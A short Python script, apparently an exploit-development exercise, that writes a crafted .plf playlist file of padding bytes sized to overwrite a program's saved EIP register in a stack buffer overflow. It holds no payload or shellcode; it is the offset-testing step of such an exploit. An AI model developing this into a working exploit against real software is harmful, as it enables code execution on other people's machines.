#!/usr/bin/env python

filename="OverwritingEIP.plf"
buffer = "A"*260+"B"*4+"C"*1736
textfile = open(filename, 'w')
textfile.write(buffer)
textfile.close()